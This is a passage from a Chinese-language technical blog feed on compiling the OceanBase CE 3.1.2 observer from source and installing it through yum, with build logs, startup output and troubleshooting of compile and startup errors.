&lt;obdevtools-binutils-2.30-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-binutils-2.30-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-bison-2.4.1-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-bison-2.4.1-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-ccache-3.7.12-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-ccache-3.7.12-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-cmake-3.20.2-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-cmake-3.20.2-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-flex-2.5.35-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-flex-2.5.35-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-gcc-5.2.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-gcc-5.2.0-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">download package &lt;obdevtools-llvm-11.0.1-3.el7.x86_64.rpm&gt;... SUCCESS</span><br><span class="line">unpack package &lt;obdevtools-llvm-11.0.1-3.el7.x86_64.rpm&gt;... SUCCESS</span><br></pre></td></tr></table></figure></div>
<h3 id="开始构建release版本：">开始构建release版本：</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入源码目录</span></span><br><span class="line">cd oceanbase</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始预构建</span></span><br><span class="line">./build.sh release</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入生成的构建目录</span></span><br><span class="line">cd build_release/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进行构建</span></span><br><span class="line">make -j8 observer</span><br></pre></td></tr></table></figure></div>
<p>主要日志摘录如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[  9%] Built target lz4_171</span><br><span class="line">[ 22%] Built target lz4_objs</span><br><span class="line">[ 27%] Built target server_pch</span><br><span class="line">[ 27%] Built target lib_pch</span><br><span class="line">[ 27%] Built target easy</span><br><span class="line">[ 27%] Built target malloc_hook</span><br><span class="line">[ 31%] Built target zstd_objs</span><br><span class="line">[ 31%] Built target ob_main</span><br><span class="line">[ 31%] Built target ob_election</span><br><span class="line">[ 31%] Built target ob_archive</span><br><span class="line">[ 40%] Built target ob_sql_server_parser_objects</span><br><span class="line">[ 40%] Built target ob_version</span><br><span class="line">[ 40%] Built target oblib_rpc</span><br><span class="line">[ 50%] Built target ob_clog</span><br><span class="line">[ 50%] Built target oblib_compress</span><br><span class="line">[ 68%] Built target oblib_lib</span><br><span class="line">[ 68%] Built target oblib_common</span><br><span class="line">[ 77%] Built target oblib</span><br><span class="line">[ 77%] Built target ob_rootserver</span><br><span class="line">[ 95%] Built target ob_server</span><br><span class="line">[100%] Built target ob_storage</span><br><span class="line">[100%] Built target ob_share</span><br><span class="line">[100%] Built target ob_sql</span><br><span class="line">[100%] Built target oceanbase_static</span><br><span class="line">[100%] Built target observer</span><br></pre></td></tr></table></figure></div>
<p>查看构建生成的文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">stat src/observer/observer</span><br></pre></td></tr></table></figure></div>
<p>日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">  File: &#x27;src/observer/observer&#x27;</span><br><span class="line">  Size: 952322576     Blocks: 1860008    IO Block: 4096   regular file</span><br><span class="line">Device: fd02h/64770d    Inode: 136988392   Links: 1</span><br><span class="line">Access: (0755/-rwxr-xr-x)  Uid: ( 2022/admin)   Gid: ( 2022/   admin)</span><br><span class="line">Access: 2022-03-01 15:07:25.922847355 +0900</span><br><span class="line">Modify: 2022-03-01 15:07:28.898122953 +0900</span><br><span class="line">Change: 2022-03-01 15:07:28.939126766 +0900</span><br><span class="line">Birth: -</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-3-启动OB">Step 3: 启动OB</h2>
<p>将obd路径下的observer改名，并将新编译好的二进制文件复制过来：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /data/ob/ob_local_data/bin</span><br><span class="line">mv observer observer-org</span><br><span class="line">cp /data/ob/code/oceanbase/build_release/src/observer/observer .</span><br></pre></td></tr></table></figure></div>
<p>然后通过obd启动observer：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster start cluster-name</span><br></pre></td></tr></table></figure></div>
<p>启动日志如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get local repositories and plugins ok</span><br><span class="line">Open ssh connection ok</span><br><span class="line">Load cluster param plugin ok</span><br><span class="line">Check before start observer ok</span><br><span class="line">[WARN] (192.168.0.36) The recommended number of open files is 655350 (Current value: 20000)</span><br><span class="line"></span><br><span class="line">Start observer ok</span><br><span class="line">observer program health check ok</span><br><span class="line">Connect to observer ok</span><br><span class="line">Wait for observer init ok</span><br><span class="line">+------------------------------------------------+</span><br><span class="line">|                     observer                   |</span><br><span class="line">+--------------+---------+------+-------+--------+</span><br><span class="line">| ip           | version | port | zone  | status |</span><br><span class="line">+--------------+---------+------+-------+--------+</span><br><span class="line">| 192.168.0.36 | 3.1.2   | 2881 | zone1 | active |</span><br><span class="line">+--------------+---------+------+-------+--------+</span><br><span class="line"></span><br><span class="line">cluster-name running</span><br></pre></td></tr></table></figure></div>
<h2 id="Step-4-连接OB">Step 4: 连接OB</h2>
<p>使用mysql client连接OB，并查看版本信息：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -h127.1 -P2881</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3221487666</span><br><span class="line">Server version: 5.7.25 OceanBase 3.1.2 (r1-d4ace121deae5b81d8f0b40afbc4c02705b7fc1d) (Built Mar  1 2022 14:55:20)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">(root@127.1) [(none)] 15:43:29&gt; select version();</span><br><span class="line">+--------------------+</span><br><span class="line">| version()          |</span><br><span class="line">+--------------------+</span><br><span class="line">| 3.1.2-OceanBase CE |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.002 sec)</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>注：<br>
Server version: 5.7.25 – OB兼容 MySQL 5.7.25 的语法<br>
d4ace121deae5b81d8f0b40afbc4c02705b7fc1d – 代码版本，与编译的源码版本一致<br>
Mar  1 2022 14:55:20 – observer编译时文件生成时间<br>
3.1.2-OceanBase CE – OB版本号</p>
</blockquote>
<h2 id="编译过程中遇到的问题">编译过程中遇到的问题</h2>
<p>上述过程都是整理过的，简单实用的步骤，而最初接触ob时，编译过程中遇到了若干问题，在此分享二点。</p>
<h3 id="Case-1：资源不足导致报错">Case 1：资源不足导致报错</h3>
<p>虚拟机资源配置过小（4c6g），导致编译失败。<br>
之前在龙蜥操作系统<code>'Anolis OS 8.2 (x86_64)'</code>进行编译，耗时过久（几个小时），最后日志报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 54%] Building CXX object src/observer/CMakeFiles/ob_server.dir/Unity/unity_ob_server_table/0_cxx.cxx.o</span><br><span class="line">make[2]: *** [src/rootserver/CMakeFiles/ob_rootserver.dir/build.make:126: src/rootserver/CMakeFiles/ob_rootserver.dir/Unity/unity_ob_rootserver_common/0_cxx.cxx.o] 已杀死</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:10563：src/rootserver/CMakeFiles/ob_rootserver.dir/all] 错误 2</span><br><span class="line">make[1]: *** 正在等待未完成的任务....</span><br><span class="line">[ 58%] Built target ob_storage</span><br><span class="line">make: *** [Makefile:166：all] 错误 2</span><br></pre></td></tr></table></figure></div>
<h3 id="Case-2-代码bug导致报错">Case 2: 代码bug导致报错</h3>
<p>之前在参与新年活动时，编译源码过程中遇到了如下报错，编译失败：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ 58%] Building CXX object src/share/CMakeFiles/ob_share.dir/Unity/unity_ob_share_object/0_cxx.cxx.o</span><br><span class="line">In file included from /home/shawnyan/oceanbase/build_release/src/share/CMakeFiles/ob_share.dir/Unity/unity_ob_share_object/0_cxx.cxx:3:</span><br><span class="line">/home/shawnyan/oceanbase/src/share/object/ob_obj_cast.cpp:1606:14: error: use of undeclared identifier &#x27;isnan&#x27;</span><br><span class="line">  &#125; else if (isnan(value)) &#123;</span><br><span class="line">             ^</span><br><span class="line">/home/shawnyan/oceanbase/src/share/object/ob_obj_cast.cpp:1609:14: error: use of undeclared identifier &#x27;isinf&#x27;</span><br><span class="line">  &#125; else if (isinf(value)) &#123;</span><br><span class="line">             ^</span><br><span class="line">/home/shawnyan/oceanbase/src/share/object/ob_obj_cast.cpp:1911:14: error: use of undeclared identifier &#x27;isnan&#x27;</span><br><span class="line">  &#125; else if (isnan(value) &amp;&amp; lib::is_oracle_mode()) &#123;</span><br><span class="line">             ^</span><br><span class="line">/home/shawnyan/oceanbase/src/share/object/ob_obj_cast.cpp:1914:14: error: use of undeclared identifier &#x27;isinf&#x27;</span><br><span class="line">  &#125; else if (isinf(value) &amp;&amp; lib::is_oracle_mode()) &#123;</span><br><span class="line">             ^</span><br><span class="line">4 errors generated.</span><br><span class="line">make[2]: *** [src/share/CMakeFiles/ob_share.dir/build.make:78：src/share/CMakeFiles/ob_share.dir/Unity/unity_ob_share_object/0_cxx.cxx.o] 错误 1</span><br><span class="line">make[1]: *** [CMakeFiles/Makefile2:10407：src/share/CMakeFiles/ob_share.dir/all] 错误 2</span><br><span class="line">make[1]: *** 正在等待未完成的任务....</span><br><span class="line">[ 58%] Building CXX object src/sql/parser/CMakeFiles/ob_sql_proxy_parser_objects.dir/__/__/__/deps/oblib/src/lib/hash_func/murmur_hash.cpp.o</span><br><span class="line">[ 58%] Building CXX object deps/oblib/src/lib/CMakeFiles/oblib_lib.dir/Unity/unity_oblib_lib_common/1_cxx.cxx.o</span><br><span class="line">[ 62%] Building CXX object deps/oblib/src/lib/CMakeFiles/oblib_lib.dir/Unity/unity_oblib_lib_common/4_cxx.cxx.o</span><br><span class="line">[ 62%] Building CXX object deps/oblib/src/lib/CMakeFiles/oblib_lib.dir/Unity/unity_oblib_lib_coro/0_cxx.cxx.o</span><br><span class="line">[ 62%] Building CXX object deps/oblib/src/lib/CMakeFiles/oblib_lib.dir/Unity/unity_oblib_lib_common/0_cxx.cxx.o</span><br><span class="line">[ 62%] Building CXX object deps/oblib/src/lib/CMakeFiles/oblib_lib.dir/Unity/unity_oblib_lib_common/5_cxx.cxx.o</span><br><span class="line">[ 62%] Built target oblib_lib</span><br><span class="line">[ 62%] Built target ob_sql_server_parser_objects</span><br><span class="line">[ 62%] Built target ob_sql_proxy_parser_objects</span><br><span class="line">make: *** [Makefile:166：all] 错误 2</span><br><span class="line">[shawnyan@anolis oceanbase]$</span><br></pre></td></tr></table></figure></div>
<p>后在github上发现了一样的issue，<a class="link"   href="https://github.com/oceanbase/oceanbase/pull/685" >https://github.com/oceanbase/oceanbase/pull/685 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
该问题已解决，并已合并进最新版本。</p>
<p>以上，就是observer源码的基本编译方法，后续可以在此基础之上编译debug版本，并进行源码调试，或是打patch。</p>
<h2 id="相关资料">相关资料</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/327631" >OceanBase 技术征文大赛第二期正式开启！快来释放你的原力！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/oceanbase-obcp-v2-exam/">OceanBase OBCP 考试经验小结</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-install-single-node/">【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-perf-testing-with-databench-t/">OB测试 | 使用 Databench-T 对 OceanBase 社区版 v3.1.2 进行性能测试</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-sql-explain/">【OBCP蓝宝书】 OceanBase 社区版 v3.1.2 如何查看执行计划</a></li>
</ul>
<p><strong>Voila, Enjoy OB!</strong></p>
<p>ShawnYan<br>
2022-03-02</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/336396" >https://www.modb.pro/db/336396 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>obcp</tag>
        <tag>observer</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
        <tag>compile</tag>
      </tags>
  </entry>
  <entry>
    <title>【OBCP蓝宝书】 基于 OceanBase 社区版 v3.1.2 搭建单机测试环境的三种方法</title>
    <url>/2022/oceanbase/ob-v3.1.2-install-single-node/</url>
    <content><![CDATA[<h2 id="概要">概要</h2>
<p>OceanBase 社区版 v3.1.2 （以下简称OB CE v3.1.2）已于近日<a class="link"   href="https://www.modb.pro/db/233677" >正式发布 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，并公布了社区版ODC、OCP、OMS等一系列生态工具。<br>
另一方面，为了使DBA更快、更全面的学习、掌握 OceanBase，官方还推出了OBCA、<a class="link"   href="https://www.modb.pro/db/234782" >OBCP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>、OBCE认证体系。<br>
OBCP蓝皮书系列文章，旨在帮助那些正在学习OB或正在备考OB认证的同学，更加有效的进行学习、掌握相关知识点。</p>
<img  alt="oceanbase-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/oceanbase/oceanbase-banner.png"
                     
                >
<p>本文主要介绍三种搭建本地测试环境的方法：</p>
<p><strong>1. CentOS 7.9 下使用 RPM 进行安装 OceanBase</strong><br>
<strong>2. CentOS 7.9 下使用 OBD 进行安装 OceanBase</strong><br>
<strong>3. 构建Docker版 mini OceanBase CE v3.1.2</strong></p>
<blockquote>
<p>注1：这里本来准备四种方法，但由于篇幅有限，且第四种方法较为复杂，故另起文章介绍。<br>
4. 编译 OceanBase CE v3.1.2 源码，并运行 observer</p>
</blockquote>
<blockquote>
<p>注2：对于初学OB或者准备OBCP考试的同学，建议使用方法二或方法三。<br>
方法二的优势在于，可安装多个组件，各模块的知识点都可以即学即用。<br>
方法三的优势在于，只需关注observer本身即可，是准备OBCP考试的必备工具。</p>
</blockquote>
<h2 id="环境信息">环境信息</h2>
<blockquote>
<p>本地虚拟机: 4c16g<br>
CentOS Linux release 7.9.2009 (Core)<br>
创建用户，并加sudo(ALL)权限：admin/admin<br>
联网环境，非离线<br>
OceanBase CE v3.1.2</p>
</blockquote>
<h2 id="一、CentOS-7-9-下使用-RPM-进行安装-OceanBase">一、CentOS 7.9 下使用 RPM 进行安装 OceanBase</h2>
<h3 id="配置Yum源">配置Yum源</h3>
<ol>
<li>将OB的Yum源下载到本地</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://mirrors.aliyun.com/oceanbase/OceanBase.repo</span><br><span class="line">sudo yum makecache fast</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看OB两个仓库的状态</span></span><br><span class="line">yum repolist oceanbase*</span><br></pre></td></tr></table></figure></div>
<p>检查结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">repo id                              repo name                       status</span><br><span class="line">oceanbase.community.stable/7/x86_64  OceanBase-community-stable-el7  58</span><br><span class="line">oceanbase.development-kit/7/x86_64   OceanBase-development-kit-el7   26</span><br><span class="line">repolist: 84</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>查看Repo源可知，有如下几个主要的RPM包</li>
</ol>
<p>两个Repo仓库：</p>
<ul>
<li><a class="link"   href="http://mirrors.aliyun.com/oceanbase/community/stable/el/7/x86_64/" >http://mirrors.aliyun.com/oceanbase/community/stable/el/7/x86_64/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="http://mirrors.aliyun.com/oceanbase/development-kit/el/7/x86_64/" >http://mirrors.aliyun.com/oceanbase/development-kit/el/7/x86_64/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">oceanbase-ce-3.1.2-10000392021123010.el7.x86_64.rpm</span><br><span class="line">oceanbase-ce-devel-3.1.2-10000392021123010.el7.x86_64.rpm</span><br><span class="line">oceanbase-ce-libs-3.1.2-10000392021123010.el7.x86_64.rpm</span><br><span class="line">oceanbase-ce-utils-3.1.2-10000392021123010.el7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<h3 id="分析各个安装包的依赖">分析各个安装包的依赖</h3>
<blockquote>
<p>注：该步骤只是为了以图示的形式直观展示各个模块之间的联系，可以跳过。</p>
</blockquote>
<p>通过该命令可以分析RPM的依赖关系。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">yum deplist oceanbase-ce | grep provider | sort | uniq</span><br></pre></td></tr></table></figure></div>
<p>汇总依赖，并绘制依赖图。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220301-90467e23-ebda-4f50-b487-a6625afdf062.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="通过Yum进行安装OB">通过Yum进行安装OB</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y oceanbase-ce ob-deploy obclient obproxy</span><br><span class="line">source /etc/profile.d/obd.sh</span><br></pre></td></tr></table></figure></div>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220301-261830c3-b766-4c4d-9b62-7970f405459a.png"
                      referrerpolicy="no-referrer"
                >
<p>注1：安装完成后，需要配置LD变量，不然observer会找不到libmariadb.so.3</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;export LD_LIBRARY_PATH=/home/admin/oceanbase/lib&quot; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line">echo $LD_LIBRARY_PATH</span><br><span class="line">ldd /home/admin/oceanbase/bin/observer</span><br></pre></td></tr></table></figure></div>
<p>前后比对结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">before</span></span><br><span class="line">[admin@centos7 ~]$ ldd /home/admin/oceanbase/bin/observer</span><br><span class="line">    linux-vdso.so.1 =&gt;  (0x00007ffdf039a000)</span><br><span class="line">    libmariadb.so.3 =&gt; not found</span><br><span class="line">    libaio.so.1 =&gt; /lib64/libaio.so.1 (0x00007f3a8ada6000)</span><br><span class="line">    libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f3a8aaa4000)</span><br><span class="line">    libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f3a8a888000)</span><br><span class="line">    libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f3a8a684000)</span><br><span class="line">    librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f3a8a47c000)</span><br><span class="line">    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f3a8a0ae000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f3a8afa8000)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">after</span></span><br><span class="line">[admin@centos7 ~]$ echo $LD_LIBRARY_PATH</span><br><span class="line">/home/admin/oceanbase/lib</span><br><span class="line">[admin@centos7 ~]$ ldd /home/admin/oceanbase/bin/observer</span><br><span class="line">    linux-vdso.so.1 =&gt;  (0x00007ffd247e0000)</span><br><span class="line">    libmariadb.so.3 =&gt; /home/admin/oceanbase/lib/libmariadb.so.3 (0x00007f7e224ee000)</span><br><span class="line">    libaio.so.1 =&gt; /home/admin/oceanbase/lib/libaio.so.1 (0x00007f7e222ec000)</span><br><span class="line">    libm.so.6 =&gt; /lib64/libm.so.6 (0x00007f7e21fea000)</span><br><span class="line">    libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007f7e21dce000)</span><br><span class="line">    libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007f7e21bca000)</span><br><span class="line">    librt.so.1 =&gt; /lib64/librt.so.1 (0x00007f7e219c2000)</span><br><span class="line">    libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f7e215f4000)</span><br><span class="line">    /lib64/ld-linux-x86-64.so.2 (0x00007f7e22754000)</span><br><span class="line">[admin@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<p>注2：需要更改文件夹属主</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chown admin:admin oceanbase/</span><br></pre></td></tr></table></figure></div>
<p>检查结果：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">before:</span></span><br><span class="line">[admin@centos7 ~]$ ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 3 admin admin 17 Feb 28 19:43 obproxy-3.2.0</span><br><span class="line">drwxr-xr-x 5 root  root  39 Feb 28 19:42 oceanbase</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">after:</span></span><br><span class="line">[admin@centos7 ~]$ ll</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 3 admin admin 17 Feb 28 19:43 obproxy-3.2.0</span><br><span class="line">drwxr-xr-x 5 admin admin 39 Feb 28 19:42 oceanbase</span><br></pre></td></tr></table></figure></div>
<h3 id="启动observer-–-报错分析，可跳过">启动observer – 报错分析，可跳过</h3>
<p>直接执行二进制文件启动</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/admin/oceanbase/</span><br><span class="line">./bin/observer</span><br></pre></td></tr></table></figure></div>
<h4 id="Case-1-invalid-cluster-id">Case 1: invalid cluster id</h4>
<p>不过，此时启动报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-02-28 20:11:46.208513] INFO  [SERVER] main.cpp:489 [7894][0][Y0-0000000000000000] [lt=5] observer is start(observer_version=&quot;OceanBase CE 3.1.2&quot;)</span><br><span class="line">[2022-02-28 20:11:46.208996] INFO  [SERVER] ob_server.cpp:870 [7894][0][Y0-0000000000000000] [lt=12] set CLUSTER_ID for rpc(cluster_id=0)</span><br><span class="line">[2022-02-28 20:11:46.211069] WARN  [SHARE] strict_check_special (ob_server_config.cpp:217) [7894][0][Y0-0000000000000000] [lt=4] invalid cluster id(ret=-4147, cluster_id.str()=&quot;0&quot;)</span><br><span class="line">[2022-02-28 20:11:46.211119] ERROR [SERVER] init_config (ob_server.cpp:889) [7894][0][Y0-0000000000000000] [lt=43] some config setting is not valid(ret=-4147) BACKTRACE:0x97b78ce 0x970134b 0x21ea8ad 0x21e9598 0x913b7f0 0x9136c0f 0x21e7705 0x7fb316156555 0x21e63e9</span><br><span class="line">[2022-02-28 20:11:46.216800] ERROR [SERVER] init (ob_server.cpp:170) [7894][0][Y0-0000000000000000] [lt=5633] init config fail(ret=-4147) BACKTRACE:0x97b78ce 0x970134b 0x21ea8ad 0x21e9598 0x9137649 0x21e7705 0x7fb316156555 0x21e63e9</span><br><span class="line">[2022-02-28 20:11:46.216859] INFO  [SERVER] ob_service.cpp:264 [7894][0][Y0-0000000000000000] [lt=10] [NOTICE] observice need stop now</span><br></pre></td></tr></table></figure></div>
<p>根据报错信息可知，cluster_id 不能为0，需要指定其他值。<br>
相关代码：<a class="link"   href="https://gitee.com/oceanbase/oceanbase/blob/master/src/observer/ob_server.cpp#L889" >https://gitee.com/oceanbase/oceanbase/blob/master/src/observer/ob_server.cpp#L889 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>指定 <code>cluster_id</code>，并启动observer:</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/observer -o cluster_id=1</span><br></pre></td></tr></table></figure></div>
<h4 id="Case-2-zone-must-not-be-empty">Case 2: zone must not be empty</h4>
<p>但启动仍报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-02-28 20:35:20.386635] ERROR [SERVER] init (ob_heartbeat.cpp:69) [9343][0][Y0-0000000000000000] [lt=43] [dc=0] zone must not be empty(zone=, ret=-4002) BACKTRACE:0x97b78ce 0x970a211 0x2225fdf 0x2225c2b 0x22259f2 0x227f927 0x90c240f 0x914fb8c 0x913f793 0x9136f3d 0x21e7705 0x7fa5f34fd555 0x21e63e9</span><br><span class="line">[2022-02-28 20:35:20.386916] WARN  [SERVER] init (ob_service.cpp:150) [9343][0][Y0-0000000000000000] [lt=275] [dc=0] heartbeat_process_.init failed(ret=-4002)</span><br><span class="line">[2022-02-28 20:35:20.386937] ERROR [SERVER] init_ob_service (ob_server.cpp:1337) [9343][0][Y0-0000000000000000] [lt=19] [dc=0] oceanbase service init failed(ret=-4002) BACKTRACE:0x97b78ce 0x970a211 0x21eb0b4 0x21eab9b 0x21ea901 0x21e9598 0x913f810 0x9136f3d 0x21e7705 0x7fa5f34fd555 0x21e63e9</span><br><span class="line">[2022-02-28 20:35:20.387040] ERROR [SERVER] init (ob_server.cpp:256) [9343][0][Y0-0000000000000000] [lt=92] [dc=0] init ob service fail(ret=-4002) BACKTRACE:0x97b78ce 0x970a211 0x21eb0b4 0x21eab9b 0x21ea901 0x21e9598 0x9139137 0x21e7705 0x7fa5f34fd555 0x21e63e9</span><br></pre></td></tr></table></figure></div>
<p>根据报错信息可知，zone不能为空。<br>
指定zone，并启动observer：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/observer -o cluster_id=1 -z zone1</span><br></pre></td></tr></table></figure></div>
<h4 id="Case-3-init-partition-service-fail">Case 3: init partition service fail</h4>
<p>依旧启动报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2022-02-28 20:51:56.026300] INFO  ob_server_config.cpp:258 [59121][0][Y0-0000000000000000] [lt=5] | datafile_disk_percentage             = 90</span><br><span class="line">[2022-02-28 20:52:01.660498] ERROR [SERVER] init_storage (ob_server.cpp:1692) [59121][0][Y0-0000000000000000] [lt=5] [dc=0] init partition service fail(ret=-4104, storage_env_=&#123;data_dir:&quot;store&quot;, default_block_size:2097152, disk_avail_space:0, datafile_disk_percentage:90, redundancy_level:1, log_spec:&#123;log_dir:&quot;store/slog&quot;, max_log_size:268435456, log_sync_type:0&#125;, clog_dir:&quot;store/clog&quot;, ilog_dir:&quot;store/ilog&quot;, clog_shm_path:&quot;store/clog_shm&quot;, ilog_shm_path:&quot;store/ilog_shm&quot;, index_cache_priority:10, user_block_cache_priority:1, user_row_cache_priority:1, fuse_row_cache_priority:1, bf_cache_priority:1, clog_cache_priority:1, index_clog_cache_priority:1, bf_cache_miss_count_threshold:100, ethernet_speed:131072000&#125;) BACKTRACE:0x97b78ce 0x970a211 0x2225fdf 0x2225c2b 0x22259f2 0x7dfadeb 0x91416de 0x9137127 0x21e7705 0x7f5651592555 0x21e63e9</span><br><span class="line">[2022-02-28 20:52:02.090076] WARN  [COMMON] check_disk_error (ob_io_manager.cpp:699) [59140][36][Y0-0000000000000000] [lt=77] [dc=0] fail to get warning disks(ret=-4006)</span><br><span class="line">[2022-02-28 20:52:02.184499] ERROR [SERVER] main (main.cpp:491) [59121][0][Y0-0000000000000000] [lt=10] [dc=0] observer init fail(ret=-4104) BACKTRACE:0x97b78ce 0x970a211 0x21eb0b4 0x21eab9b 0x21ea901 0x21e9598 0x21e7a0a 0x7f5651592555 0x21e63e9</span><br></pre></td></tr></table></figure></div>
